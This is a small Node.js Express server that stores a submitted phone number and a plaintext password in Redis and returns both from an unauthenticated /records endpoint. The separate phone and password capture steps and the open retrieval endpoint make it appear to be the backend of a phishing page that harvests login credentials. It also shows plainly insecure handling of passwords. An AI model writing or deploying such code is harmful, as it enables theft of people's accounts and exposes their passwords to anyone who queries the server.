import express from 'express';
import Redis from 'ioredis';

const app = express();
app.use(express.json());

// Redis подключение
const redis = new Redis(process.env.REDIS_URL);

// === SAVE PHONE ===
app.post('/save-phone', async (req, res) => {
  try {
    const { phone } = req.body;
    await redis.hset('last', 'phone', phone);
    res.json({ ok: true });
  } catch (err) {
    console.error('/save-phone error:', err);
    res.status(500).json({ ok: false });
  }
});

// === SAVE PASSWORD ===
app.post('/save-password', async (req, res) => {
  try {
    const { password } = req.body;
    await redis.hset('last', 'password', password);
    res.json({ ok: true });
  } catch (err) {
    console.error('/save-password error:', err);
    res.status(500).json({ ok: false });
  }
});

// === GET RECORDS ===
app.get('/records', async (req, res) => {
  try {
    const data = await redis.hgetall('last');
    res.json([data]);
  } catch (err) {
    console.error('/records error:', err);
    res.status(500).json({ ok: false });
  }
});

// === PORT FIX FOR RENDER ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Backend running on port", PORT);
});
